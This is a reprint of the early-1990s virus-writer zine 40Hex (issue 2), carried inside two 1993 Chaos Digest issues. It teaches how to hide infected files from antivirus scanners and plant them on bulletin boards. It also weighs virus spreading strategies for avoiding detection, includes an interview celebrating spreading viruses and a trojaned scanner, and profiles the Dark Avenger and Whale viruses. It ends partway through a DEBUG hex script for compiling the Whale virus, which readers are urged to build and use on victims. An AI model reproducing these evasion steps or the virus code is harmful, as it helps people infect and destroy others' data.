        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #000-5(1) (reprint)


40Hex Volume 1 Issue 2                                              0000


001...........................How to sneak infected files into past SCAN
002...........................The safe way to play with viruses.
003...........................Theory Dept.  Viruses Slow vs. Fast.
004...........................Interview of the month: Skism One.
005...........................Artical on The Dark Avenger.
006...........................The mother of all viruses - WHALE!
007...........................And now a word from a real dick.
008...........................The Ontario Virus.
009...........................The 1260 Virus.
010...........................The Skism 808 source code.
011...........................Vienna/Violator source code.


                              40Hex Staff

Hellraiser....................Editor/Programming Consultant ETC...
Nick Haflinger -=PHALCON=-....CO-Editor/Writer/Theory Consultant
Skism One.....................Virus supply/Co-Programming Consultant
The Punisher (Brooklyn).......Virus supply
Garbage Heap..................Main Virus Supply/Overseer
Spell Checker.................Obvoiusly there is none


Call the 40HEX/SKISM Homebase      -----    The Landfill BBS (914)-HAK-VMBS
                                            Sysop Garbage Heap.
                                            Home of -=PHALCON=-


40Hex wants YOU - The write articles for this mag.  Lets make it world wide!
Send any articles to the 40Hex HQ - The Landfill BBS!

Special shout out to - Sub-Zero (the hard core group), DC Wave, all the
                       kids at school.

+++++

40Hex Volume 1 Issue 2                                                 0001

             - HOW TO GET INFECTED FILES INTO LAME BBS's -

    Ok, one problem with sending infected files to BBS's is that you never
can tell if they will be detected by SCAN.  Or if you are sending bombs
the sysop might use CHK4BOMB to detect code that is data damaging.

I'm gonna tell you how to get around this, what you need is the following-

                            PKLITE or LZEXE
                                  and
                           A good hex editor

What you do is this, compress the infected file with Pklite or Lzexe.  This
will make change the files checksum and ID strings quite a bit so it can't
be detected by SCAN and damaging data will not be found by CHK4BOMB.  The
problem is that now the sysop can use CHK4LITE to detect is the file is
indeed infected.   So what you do is this --

Load up the hex editior -

Now look at the file, it will look something like this if you compressed it
with PKLITE.

---------------------------------------------------------------------------

0000  4D 5A 12 01 13 00 00 00-07 00 98 05 4A A4 52 02  MZJR
0010  00 04 00 00 00 01 F0 FF-50 00 00 00 03 01 50 4B  PPK
0020  4C 49 54 45 20 43 6F 70-72 2E 20 31 39 39 30 20  LITE Copr. 1990
0030  50 4B 57 41 52 45 20 49-6E 63 2E 20 41 6C 6C 20  PKWARE Inc. All
0040  52 69 67 68 74 73 20 52-65 73 65 72 76 65 64 00  Rights Reserved
0050  0A 00 20 00 17 01 48 00-4A 04 4A A4 E2 03 00 40   HJJ@
0060  00 00 56 11 00 00 1C 00-00 00 00 00 00 00 00 00  V
0070  B8 E3 07 BA 4B 02 8C DB-03 D8 3B 1E 02 00 73 1D  K;s
0080  83 EB 20 FA 8E D3 BC 00-02 FB 83 EB 19 8E C3 53   S
0090  B9 C3 00 33 FF 57 BE 48-01 FC F3 A5 CB B4 09 BA  3WH
00A0  36 01 CD 21 CD 20 4E 6F-74 20 65 6E 6F 75 67 68  6! Not enough
00B0  20 6D 65 6D 6F 72 79 24-FD 8C DB 53 83 C3 2D 03   memory$S-
00C0  DA BE FE FF 8B FE 8C CD-8B C5 2B EA 8B CA D1 E1  +

----------------------------------------------------------------------------

You see the header?  Well what you have to do is overwrite the header with
garbage.  Don't write text cause that is to dectectable by a dump program.
Just overwrite the part that says "PKLITE corp....Reserved" with hex bytes.
Also distroy the part of the code that says "Not enough memory", dont kill
the "$" symbol.

This will make the compressed file-

A> Undetectable to virus scanners, and CHK4BOMB type programs
B> Un-Decompressable
C> CHK4LITE wont notice it as a PKLITE file

It's that easy!

Keep in mind however than any file that the virus infects will no longer
be encrypted by PKLITE, so this method is good only on getting your virus
into the front door.

See the article in issue one on making new virus strains.


                                Forenote

After writing this article SCAN Version 80 came out, It now has the
ability to scan into Pklite compressed files.  Just to let you know that
this teqnique still works and SCAN cannot detect the file as being
compressed as PKLITE.

                                                                         HR

+++++

40Hex Volume 1 Issue 2                                                 0002

                THE SAFE WAY TO EXPERIMENT WITH VIRUSES

The problem with fooling around with viruses is that you never know
what damage there going to do to your hard disk.  I have a couple of
so called viruses that when run, automatically screw up the FAT on
all the disks in the system.  Well, theres a way around getting the
shaft from these programs, and also to experiment with legitament
viruses.

The key is the DOS utitlity SUBST, make this batch file, and copy it
to a floppy.

----------------------------------------------------------------------------
@echo off
subst d: a:\
subst c: a:\
----------------------------------------------------------------------------

What this will do is send any access to disks C: and D: (the two
hard disks in my case) to drive A:  So the only damage inflicted
will be to the floppy in A:

No programs can access you hard disk when this command is issued.  I
use it all the time and as of now it has proved 100% safe.

Oh yeah, if you dont feel like distroying a floppy every time you
mess with a virus, you can do this teqnique from a RAM disk.

Have fun...
                                                                         HR

+++++

40Hex Volume 1 Issue 2                                                 0003


Virus Spreading - Fast Or Slow?               By Nick Haflinger -=PHALCON=-

Call The LandFill BBS (914) Hak-Vmbs
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

     One of the questions while writing your virus is how quickly you want
it to spread.  The easy answer is "As fast as possible" but this is not
always the best answer.  If a virus moves slowly, it will take much longer
before somebody notices hard drive space disappearing, he/she will notice
fewer changes to the file dates, and all other symptoms will be lessened.
However, this does provide longer for anti-virus people (pronounced Scum,
with a capital S) to discover the virus.  This issue ties directly into the
issue of activation, short or long.  Since the issues are virtually
identical, I will cover both together, because they are so closely tied.

                        The Case For Fast
                        +++++++++++++++++

     Viri should spread as quickly as possible.  This allows as little
time as possible for the makers of antivirus programs to come up with an
antidote before the virus is widely spread.  This should be tied with a
short activation period to cause as many problems as possible before
detection is possible.  Because fewer copies are generated before activation,
each copy may be larger.  This allows for more extensive anti-anti-viral
tactics, which are becoming increasingly more important as the number of
anti-viral products rises.  Just remember, most of these products are shit.
So don't worry too much.

                        The Case For Slow
                        +++++++++++++++++

     Viri should spread slowly, because this is less obtrusive, and therefore
users are less likely to notice a change in the system.  This should be
coupled with a long activation period as to have maximum penetration before
the virus activates.  A slow-spreading virus will circulate to more virus
programmers who will be able to modify the program for specific needs or to
adapt to antiviral tactics.  On a purely academic note, slow spreading viri
must be smaller, as more copies must be generated.  This means that viri must
be programmed better, which is good for the general community.

                       The Case Against Fast
                       +++++++++++++++++++++

        Fast spreading of viri is likely to draw attention.  Once a virus
has been caught, in most of the cases, it is dead and useless.  A virus
should infect the greatest area in the shortest time before the anti-virus
people inevitably catch up to the virus.  However, because of the necessity
of a short activation time, this virus has a lesser range than a slow-
spreading virus.  The programmer must rely on either (a) the quick
distribution of the virus along at least a regional level --or-- (b) the
ability of other virus programmers to obtain and modify either the source
code or dissassemble and modify the distributed virus.  If possible, the
source should be distributed along trusted channels.  There should be as
little chance as possible of an antiviral researcher obtaining a copy of
the sourse for your masterpiece.

                        The Case Against Slow
                        +++++++++++++++++++++

        A slow spreading virus is much more likely to get caught by antiviral
people prior to its necessarily long pre-activation period.  There will be
more defenses out against the virus before it has spread much.  However, if
the virus is well-done, it will have spread far before it is caught.

                             Conclusion
                             ++++++++++

        Actually, I lied.  There is no conclusion to be drawn from this, as
this is in itself the conclusion of long hours of thought and much
brainstorming on BBSs.  If you would like to comment, I can be reached on
LandFill BBS, phone number above.  In a future article, I will attempt to
cover anti-anti-virus tactics.  I may also respond to some important
questions/comments I may receive.  Start your viri now!  And may the best
bug win!
                                                                         NH

+++++

40Hex Volume 1 Issue 2                                                 0004

           Interview with Skism One - AKA Lord SSS (triple S)

This interview was taken by Hellraiser on July 7, 1991 in Washington
Square Park, Manhatten.

HR:  So what got you started in the virus business?

SSS: Well, I used to write graffiti all over and that got sort of
     played out, so I needed something else distructive to do.  So
     I started getting into computers, then the next thing you know
     I'm writing viruses.

HR:  What was you first experence with viruses?

SSS: Well the first time I heard of them was when that dickhead got
     arrested for putting the worm...

HR:  You mean Morris?

SSS: Yeah that asshole, it was on the news and all that - so I got
     to thinking, that would be a cool thing to do.

HR:  What was the first virus you ran across?

SSS: Ha... Some dick gave me a copy of (pause) it think it was
     Norton 4.0 when it first came out.  So I took it home and put
     it on my hard drive.  The next thing you know all this weird
     shit starts going on.  Like programs won't run and this little
     box opens up on the bottom of my screen all of a sudden.  So I
     get a copy of SCAN, then I find out almost all my files are
     infected with Jerusalem.

HR:  What did you do?

SSS: Well I re-formatted the drive and examined the copy of Jeru for
     months.  Then one day I used a Hex editor to change the suMSDOs
     string to SKISM-1.  Then I went to all the computers I could
     find and infected them.  The next thing you know my friend
     shows me this list with my name on it.  It was Patti Hoffmans
     document.  Shit, I thought I was the man back then.

HR:  Then what?

SSS: Then - well I got into assembler and dissasembly and I started
     to learn how to modify the code and all that.  The next thing
     you know I had made my own virus from the scraps of Jeru.

HR:  Captian Trips, right?

SSS: Yeah, sort of.  Then someone I know sent it to all the boards
     in town under a trojan name and fucked a lot of peoples shit
     up.  Oh well.  Then I guess I grew out of the scavenger mode
     and started writting my own shit, from scratch.

HR:  Like what?

SSS: Well they were all called Skism so and so, like Skism 10, Skism
     11 and all that.  Then I meet people and they started helping
     me out and now we got this thing going on.

HR:  You mean Smart Kids Into Sick Methods?

SSS: Yeah, you know all thid did did dat.

HR:  How do you name your viruses?

SSS: Well depends whats on my mind.  Skism was my tag for like four
     years, so I thought it would be cool if people saw my name in
     the newspaper and all that.  I got Captian Trips after reading
     The Stand, by Stephen King.  1992 was just what I named it cause
     the virus came out to be about 1945 bytes so I jusy padded it out
     to next years date.  808 was named after the TR-808, a 'drum
     machine' used in hip-hop.

HR:  Whats the latest projects?

SSS: You know, you wrote most of the shit.

HR:  Tell them.  The people.

SSS: Well, we did SKISM 1992, which was funny, then a member of
     SKISM, who shall be nameless made 808.  Now I'm just taking a
     break from viruses and computers for the summer.

HR:  You stopped?

SSS: Your crazy, nah - It's got to wait a while, then I'll get back
     into it - when school starts again.

HR:  What do you think of McAffe?

SSS: He's cool, what the fuck am supposed to say.  He does a good
     job at spreading my name around.  I really like Pat Hoffman,
     thanks for the write ups.  You got to understand - these people
     make us into infamous villians.  I can deal with that.

HR:  Do you mind them detecting your viruses?

SSS: Nah, fuck it - If my shit can make it from NY to California
     without effort, it shows it works.  Thats it.  Thers a lot more
     where that came from.  One more thing, I hate that gay bitch
     Ross Greenburg author of Flu-Shot.  What
     a dick.  He's just an asshole tring to sell his shit product.
     He's got a big mouth and instead of crashing his board, I'd
     like to kick his fucken ass.  Where's his office?  Up one 57th
     right?  Lets take a walk.  Just kiddin' but the guys product
     sucks and he's just a greedy asshole.  I'm glad I sent a trojan
     version of his virus scanner around. Ha you dick!

HR:  What virus authors do you look up to?

SSS: Myself - Ha Ha (laughter) Ha Ha.  No, I love Whale - that was
     clever.  I like Dark Avenger, the real one.  Its hard to be
     original, and these guys were.  Hats off you crazy fuckin'
     Bulgarian Metal-Head!

HR:  What about groups of virus writers?

SSS: I think were the only one.  Oh yeah and those Rabid people you
     told me about, yeah there just like us - people tring to make
     there mark in the world, or should I say dent in the world.
     Germans are bugging out too - Shit, they write half the shit out
     there these days.  More power to them

HR:  What is your advise to people who want to write viruses?

SSS: Get a late pass!  No as I said more power to you. Just remember
     you got to have style and learn to be ORIGINAL.

HR:  What next from you?

SSS: I don't really know.  I'm waiting to hook up a few more people
     to the pack, then we'll get the thing rollin HARD.  Till then
     'A little at a time...'


At the time this artical was finished, the Skism team was at work on
a new virus code named Bad Brains.
                                                                    HR

+++++

40Hex Volume 1 Issue 2                                                 0005

                       The Dark Avenger
                       --- ---- -------

Part I.  The Dark Avenger
-------------------------

Introduction:

The following text file was sent directly to Professor Vesselin Bontchev in
a public sent to an anti-viral board located in Sofia, Bulgaria.

Bontchev is one of the leading anti-viral researchers in Europe today.  A
producer of number of effective anti-viral programs in Bulgaria, his
programs are widely used throughout Europe.

The Dark Avenger is Bulgaria's most dangerous viral code writer and a heavy
metal fanatic - as this message concerning himself, written by him (often
referring to himself in third person) reveals:

+++++
DARK AVENGER
============

DARK AVENGER is the pseudonym used by a particularly prolific and
malicious Bulgarian virus writer. It is also the name given in the
West to some of his earlier viruses. His viruses include:

DARK AVENGER V651, V1800, V2000 and V2100

NUMBER OF THE BEAST aka 512 (several versions)

ANTHRAX (Infects both files and boot sectors)

V800 and its derivatives: 1226, PROUD, EVIL & PHOENIX

Some other viruses, e.g. NOMENKLATURA & DIAMOND are in his style but
are believed to be the work of others. MURPHY has been strongly
influenced by him but is known to be of different authorship.
CRAZY EDDIE may also be his.

Several 'hacks' are now appearing of V1800, V2100, MURPHY and DIAMOND.

Eddie is the mascot of the British heavy metal group, Iron Maiden
(hence 'up the irons'). It is a 20 foot high skeleton that appears
on stage with them and is featured on the sleeves of all their
albums.

Anthrax and Damage Inc are other heavy metal groups whose names have
been featured in some Dark Avenger viruses. Iron Maiden numbers have
also been mentioned including 'Somewhere in Time', 'Only the Good Die
Young' and 'Number of the Beast'.

Unusually, this virus writer has also produced a virus removal
program together with a version log of his EDDIE series, as
reproduced below with its original spelling and grammar.

"DOCTOR   QUICK!   Virus Doctor for the Eddie Virus   Version 2.01
10-31-89 Copyright (c) 1988-89 Dark Avenger.  All rights reserved.
DOCTOR /? for help

It may be of interest to you to know that Eddie (also known as "Dark
Avenger") is the most widespread virus in Bulgaria for the time
being.  However I have information that Eddie is well known in the
USA, West Germany and USSR too.

I started in writing the virus in early September 1988. In those
times there were no any viruses in Bulgaria, so I decided to write
the first Bulgarian virus.  There were some different Eddie's versions:

VERSION 1.1, 16-DEC-1988

In December I've decided to enhance the virus.  This version could
infect files during their opening.  For that reason, a read buffer
was allocated in high end of memory, rather than using DOS function
48h when needed.  The disk was destroyed instead of the infected files.

VERSION 1.2, 19-DEC-1988

This added a new feature that causes (for example) compiled programs
to be infected at once if the virus is resident.  Also, the "Eddie
lives..." message was added (can you guess why exactly "Eddie"?)

VERSION 1.31, 3-JAN-1989

This became the most common version of Eddie. A code was added to
find the INT 13 rom-vector on many popular XT's and AT's.  Also,
other messages were added so its length would be exactly 1800 bytes.
There was a subsequent, 1.32 version (19-JAN-1989), which added
self-checksum and other interesting features that was abandoned
because it was extremely buggy.

In early March 1989 version 1.31 was called into existence and
started to live its own life to all engineers' and other suckers'
terror.  And, the last

VERSION 1.4, 17-OCT-1989

This was a bugfix for version 1.31, and added some interesting new
features.  Support has been added for DOS 2.x and DOS 4.x.  For
further information about this (the most terrible) version, and to
learn how to find out a program author by its code, or why
virus-writers are still not dead, contact Mr. Vesselin Bontchev (All
Rights Reserved).

So, never say die!  Eddie lives on and on and on...  Up the irons!"

NOTE:
Vesselin Bontchev, who the Dark Avenger is trying to discredit, is a
leading virus researcher at the Bulgarian Academy of Sciences.
+++++

Post Note:

There is a rumor concerning the fact that RABID now has the Dark Avenger on
their staff of virus writers, and that the new Dark Avenger variant released
by them was, in fact, written by him.  This has yet to be proven.

The more acceptable belief concerning this new strain is that RABID simply
picked up the source code for Dark Avenger, released last December, and
modified it.

Part II - Dark Avenger - Strain A
---------------------------------

Vesselin Bontchev reports in May 1990:

The Dark Avenger virus.
======================

- I found two new mutations of this virus. Well, maybe
  "mutations" is not the correct word. In the first of them, the
  first 16 characters of the string "Eddie lives...  somewhere in
  time!" were replaced with blanks.

In the second example, all strings (the message above, the
copyright message and the "Diana P."  string) were replaced with
blanks.  - The author of the Dark Avenger virus (The bastard!  I
still cannot determine who he is.) has released the source code
of his virus.

It is full with ironic comments about me.  Of course, now we have
to expect lots of new, similar viruses to appear.  At least, this
leaded to one good thing - the source helped me very much in
disassembling the V2000 virus.  - I received a rather offensive
anonymous letter from this person.  In it he claims to be also
the author of both the V2000 (I trust this) and the Number of the
Beast viruses (the latter is unlikely).  [See Above]


Information About the Dark Avenger Virus, courtesy of
"Virus Bulletin Ltd," Buckinghamshire, England.

Note:

This information is far more valuable than the standard
Virus Summary by Patricia Hoffman.  Her entry concerning DA
fails to go into more depth about the Dark Avenger virus and
apparently she has yet to receive information of the
different versions of DA.  Such information is already a year
old, but she has yet to include it.

Entry...............: Dark Avenger
Alias(es)...........: ---
Virus Strain........: Dark Avenger
Virus detected when.: November 1989
              where.: USA
Classification......: February 1990
Length of Virus.....: about 1800 Bytes
--------------------- Preconditions -----------------------------------
Operating System(s).: DOS
Version/Release.....:
Computer model(s)...: IBM-compatible
--------------------- Attributes --------------------------------------
Easy Identification.: Two Texts:
                      "Eddie lives...somewhere in time" at beginning
                      and
                      "This Program was written in the City of Sofia
                      (C) 1988-89 Dark Avenger" near end of file

Type of infection...: Link-virus
                      COM-files: appends to the program and installs a
                                 short jump
                      EXE-files: appends to the program at the
                                 beginning of the next paragraph

Infection Trigger...: COM and EXE files are corrupted on any read
                      attempt even when VIEWING!!!

Storage media affected: Any Drive

Interrupts hooked...: Int 21 DOS-services
                      Int 27 Terminate and Stay Resident

Damage..............: Overwrites a random sector with bootblock

Damage Trigger......: each 16th infection; counter located in
                      Bootblock

Particularities.....: -

Similarities........: -

--------------------- Agents ------------------------------------------

Countermeasures.....: NONE! All data can be destroyed !!!!
                      There is no way in retrieving lost data.
                      Backups will most probably be destroyed too.

Countermeasures successful: install McAfee's SCANRES.

Standard means......: Good luck! Hopefully the virus did not destroy
                      too many of your programs and data.

--------------------- Acknowledgement ---------------------------------
Location............: VTC Uni Hamburg
Classification by...: Matthias Jaenichen
Documentation by....: Matthias Jaenichen
Date................: 31.01.1990

------------------------------

End of Chaos Digest #1.27
************************************

Chaos Digest           Mercredi 19 Mai 1993        Volume 1 : Numero 28
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.28 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #005(2)-006(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #005(2)-006(1) (reprint)


Part III - DARK AVENGER 2000
----------------------------

Date:    02 Feb 90 10:49:00 +0700
From:    Vesselin Bontchev

This virus is also "made in Bulgaria" and again I am indirectly the cause of
its creation.  I am a well known "virus-buster" in Bulgaria and my antivirus
programs are very widely used.  Of course, virus designers didn't like it.
So their next creation...  causes trouble to my antivirus programs.

This virus is exactly 2000 bytes long and I think that it was created by the
author of the Eddie (Dark Avenger) virus.  The programming style is the same
and there are even pieces of code which are the same.

The virus acts much like the Eddie one --- it installs resident in memory by
manipulating the memory control blocks; infects COMMAND.COM at the first run;
infects both .COM- and .EXE-files; infects files when one executes them as
well as when one copies them.

However, there are some extras added.  First, the virus is able to fetch the
original INT 13h vector just like the V512 one (by using the same
undocumented function --- tricks spread fast between virus programmers).

Second, it intercepts the find-first (FCB) and find-next (FCB) functions --
just like V651 (aka EDDIE II) (and contains the same bugs), so you won't see
the increased file lengths in the listing displayed by the DIR command.

Third, it contains the string "Copyright (C) 1989 by Vesselin Bontchev", so
people may think that I am the author of this virus.  In fact, the virus
searches every program being executed for this string (the case of the
letters does not matter) and if found, hangs the system.  It is not necessary
to tell you that all my antivirus programs contain this string.  Of course,
now I will have to use some kind of encryption, just to prevent such tricks.

Vesselin Bontchev reported in May 1990:

The V2000 virus (DARK AVENGER 2000)
===================================

- It turned out that the example of this virus I sent to some of the
antivirus researchers was not the original version.  The original contains
the string "Only the Good die young..." instead of the "Copy me - I want to
travel" message.  Also a small piece of code in the original version was
patched to contain the "666" string. (That is, the version you have contains
this string, the original does not.)

- There exists also a small mutation of the version you have.  The only
difference is that the C' character in the word "Copy" was changed to Z'.

- When describing the V2000 virus, I stated that it halts the computer if you
run a program which contains the string "Copyright (c) 1989 by Vesselin
Bontchev". This is not quite correct. In fact, the programs are only checked
for the "Vesselin Bontchev" part of the string.

- I obtained John McAfee's program Clean, version 60.  In the accompanying
documentation he states about the V2000 virus that "The virus is very
virulent and has caused system crashes and lost data, as well as causing some
systems to become non-bootable after infection".  This is not very correct,
or at least, there is much more to be said.  The virus is exactly as virulent
as the Dark Avenger virus, and for the same reason.  It infects files not
only when one executes them, but also when one reads or copies them. This is
achieved exactly in the same manner as in the Dark Avenger.  The systems
become non-bootable when the virus infects the two hidden files of the
operating system - it cannot distinguish them from the regular .COM files.
By the way, the Dark Avenger virus often causes the same effect.  And at
last, but not least (:-)), the virus is highly destructive - just as the Dark
Avenger is.  It destroys the information on a randomly selected sector on the
disk once in every 16 runs of an infected program. The random function is
exactly the same, and the counters (0 to 15 and for the last attacked sector)
are exactly the same and on the same offsets in the boot sector as with the
Dark Avenger virus.  The main difference is that the destroyed sector is
overwritten not with a part of the virus body, but with the boot sector
instead.  This makes a bit more difficult to discover which files are
destroyed - the boot sector is contained in many "good" programs, such as
FORMAT, SYS, NDD.  Also, the nastiest thing - the damage function is not
performed via INT 26h (which can be intercepted).  The virus determines the
address of the device driver for the respective disk unit (using an
undocumented DOS function call, of course.  I begin to wonder if Ralf Brown
did any good when he made the information in the INTERxyy file available :)).
Then it performs a direct call to that address.  The device driver in DOS
does its work and issues the appropriate INT 13h.  However the virus has
scanned the controllers' ROM space and has determined the original address of
the interrupt handler - just as the Dark Avenger virus does.  Then it has
temporary replaced the INT 13h vector with the address of this handler.  The
result is that the damage function cannot be intercepted.

- Also this virus (unlike Dark Avenger) supports PC-DOS version 4.0 and will
work (and infect) under it.

- The bytes 84 A8 A0 AD A0 20 8F 2E in the virus body are the name "Diana
P.", this time written in cyrillics.

                                                           Unknown Source

+++++

40Hex Volume 1 Issue 2                                                  0006

                            The Whale Virus

     Oh yes here it is, the biggest and meanest virus around.  First
     before you go and compile it read what Patti thinks of it.


Aliases:     Mother Fish, Stealth Virus, Z The Whale
V Status:    Research
Discovered:  August, 1990
Symptoms:    .COM & .EXE growth; decrease in available memory;
             system slowdown; video flicker; slow screen writes;
             file allocation errors; simulated system reboot
Origin:      Hamburg, West Germany
Eff Length:  9,216 Bytes
Type Code:   PRhA - Parasitic Resident .COM & .EXE Infector
Detection Method: ViruScan V67+, Pro-Scan 2.01+, NAV, IBM Scan 2.00+
Removal Instructions:  Scan/D, CleanUp V67+, Pro-Scan 2.01+,
             or Delete infected files
General Comments:

The Whale Virus was submitted in early September, 1990.  This virus had been
rumored to exist since the isolation of the Fish 6 Virus in June, 1990.  It
has been referred to by several names besides Whale, including Mother Fish
and Z The Whale.  The origin of this virus is subject to some speculation,
though it is probably from Hamburg, West Germany due to a reference within
the viral code once it is decrypted.

The first time a program infected with the Whale Virus is executed, the Whale
will install itself memory resident in high system memory but below the 640K
DOS boundary.  On the author's XT clone, the virus always starts at address
9D90.  Available free memory will be decreased by 9,984 bytes.  Most
utilities which display memory usage will also indicate a value for total
system memory which is 9,984 bytes less than what is actually installed.

The following text string can be found in memory on systems infected with the
Whale virus:

                             "Z THE WHALE".

Immediately upon becoming memory resident, the system user will experience
the system slowing down.  Noticeable effects of the system slowdown include
video flicker to extremely slow screen writes.  Some programs may appear to
"hang", though they will eventually execute properly in most cases since the
"hang" is due to the slowing of the system.

When a program is executed with the Whale memory resident, the virus will
infect the program.  Infected programs increase in length, the actual change
in length is usually 9,216 bytes.  Note the "usually": this virus does
occasionally infect a program with a "mutant" which will be a different
length.  If the file length increase is exactly 9,216 bytes, the Whale will
hide the change in file length when a disk directory command is executed.
If the file length of the viral code added to the program is other than 9,216
bytes, the file length displayed with the directory command will either the
actual infected file length, or the actual infected file length minus 9,216
bytes.

Executing the DOS CHKDSK program on infected systems will result in file
allocation errors being reported.  If CHKDSK /F is executed, file damage
will result.

The Whale also alters the program's date/time in the directory when the file
is executed, though it is not set to the system date/time of infection.
Occasionally, Whale will alter the directory entry for the program it is
infecting improperly, resulting in the directory entry becoming invalid.
These programs with invalid directory entries will appear when the directory
is listed, but some disk utilities will not allow access to the program.
In these cases, the directory entry can be fixed with Norton Utilities FD
command to reset the file date.

The Whale occasionally will change its behavior while it is memory resident.
While most of the time it only infects files when executed, there are periods
of time when it will infect any file opened for any reason.  It will also, at
times, disinfect files when they are copied with the DOS copy command, at
other times it will not "disinfect on the fly".

Occasionally, the Whale Virus will simulate what appears to be a system
reboot.  While this doesn't always occur, when it does occur the Break key
is disabled so that the user cannot exit unexpectedly from the execution of
the system's AutoExec.Bat file.  If the AutoExec.Bat file contained any
software which does file opens of other executable programs, those opened
executable programs will be infected at that time if they were not previously
infected.  Typically, files infected in this manner will increase by 9,216
bytes though it will not be shown in a directory listing.

A hidden file may be found in the root directory of drive C: on infected
files.  This file is not always present, the virus will sometimes remove it,
only to recreate it again at a later time.  The name of this hidden file is
FISH-#9.TBL, it contains an image of the hard disk's partition table along
with the following message:

        "Fish Virus #9
         A Whale is no Fish!
         Mind her Mutant Fish
         and the hidden Fish Eggs
         for they are damaging.
         The sixth Fish mutates
         only if the Whale is in
         her Cave."

After the discovery of this hidden file, the author of this document made
several attempt to have the Fish 6 Virus mutate by introducing it and Whale
into a system.  Under no circumstances did a mutation of either virus result,
the resultant files were infected with both an identifiable Fish 6 infection
and a Whale infection.

Whale is hostile to debuggers and contains many traps to prevent successful
decryption of the virus.  One of its "traps" is to lock out the keyboard if
it determines a debugger is in use.

        Here's a side note by the author of F-Prot


                             Whale

This is a recent, rather remarkable virus.  It is long, 9216 bytes and
able to infect COM and EXE files.  The increase in file size is not
visible though, while the virus is active in memory, as it uses several
advanced "stealth" methods.  Other effects of the virus are not known,
but one infected program displayed the following message when run:

             THE WHALE IN SEARCH OF THE 8 FISH
             I AM 'knzyvo ' IN HAMBURG addr error D9EB,02

Most of the virus is devoted to encryption and code which moves blocks of
virus code around.  This overhead results in a considerable slowdown of
infected systems.


     And here it is.  Use your editor to copy the below machine language
     script to a file called WHALE.SCR  Next use DEBUG to make it into a
     COM file.  Use the command  DEBUG < WHALE.SCR   When it gets done
     you'll see a file called WHALE.COM.  There it is, have fun - and
     make some losers day!

---------------------------------------------------------------------------

n whale.com
e 0100  E9 C9 23 01 F5 21 E1 02 C0 00 D2 07 FF FF 99 14
e 0110  00 E9 B8 23 CD 20 8D 01 BD 00 E1 02 C0 00 D2 07
e 0120  FF FF 99 14 FE FF E3 8F 01 00 99 14 1E 00 00 00
e 0130  26 FB 5A 26 47 48 63 33 57 6E 52 4C 63 3D FF 10
e 0140  D4 06 75 EC 06 7E 17 75 25 FA 03 24 3D 8B 21 90
e 0150  C3 24 67 2A 08 12 07 C4 E0 5B 08 9C 06 E1 15 66
e 0160  03 7B 25 7D D4 06 4E 36 9C 08 90 C3 24 D4 06 4C
e 0170  36 FF 38 D4 06 4A 36 35 02 40 C7 20 7D 25 E5 13
e 0180  C7 20 48 25 26 34 C3 77 3D 8B 29 3D 8B 38 48 81
e 0190  E5 5C 01 BA 1D 53 AF CD CF CF 22 02 D9 A7 29 27
e 01A0  4A 2E D9 14 2E 05 24 5F D5 B7 EB 38 1D 1F CE BF
e 01B0  FF CC 4B BB 11 1B 81 11 06 EF A5 D0 02 A7 24 68
e 01C0  63 AD 0A 07 0C E8 A2 14 E8 5E 1A 38 38 E5 68 30
e 01D0  23 BD DB 29 AA 6A 23 92 26 48 3A F5 2C 38 B3 4A
e 01E0  E0 16 AE 59 1C 03 01 88 2C F6 F5 0E 92 3E 22 3A
e 01F0  B1 13 33 1C B7 D8 19 BD 1F FE 0B 4E 1C 0D F6 53
e 0200  0E F6 BD 2D 27 CE 28 09 1C D3 5C BE DE C0 E7 83
